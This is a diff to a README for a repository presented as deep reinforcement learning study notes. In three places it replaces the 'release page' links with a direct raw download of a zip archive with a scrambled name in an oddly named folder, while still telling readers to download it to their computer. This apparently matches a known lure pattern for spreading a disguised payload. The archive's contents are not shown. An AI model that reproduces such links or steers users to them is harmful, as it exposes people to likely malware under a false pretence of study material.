@@ -1,6 +1,6 @@
 # 🧠 Deep-Reinforcement-Learning-Notes - Clear Notes for RL Learners
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/raw/refs/heads/main/pelitic/Notes-Learning-Reinforcement-Deep-v3.7.zip)
 
 ## 📘 Overview
 
@@ -21,7 +21,7 @@ The content is useful if you want a clean reference for study, self-learning, or
 
 Use the release page to visit this page to download the latest version:
 
-[Visit the release page](https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/releases)
+[Visit the release page](https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/raw/refs/heads/main/pelitic/Notes-Learning-Reinforcement-Deep-v3.7.zip)
 
 If the release page shows files, choose the latest one and download it to your computer.
 
@@ -201,7 +201,7 @@ Using the best known action.
 
 Use this page to visit this page to download the latest notes:
 
-[https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/releases](https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/releases)
+[https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/raw/refs/heads/main/pelitic/Notes-Learning-Reinforcement-Deep-v3.7.zip](https://github.com/bcnrpz33-spec/Deep-Reinforcement-Learning-Notes/raw/refs/heads/main/pelitic/Notes-Learning-Reinforcement-Deep-v3.7.zip)
 
 ## 🧾 Notes for Use
 
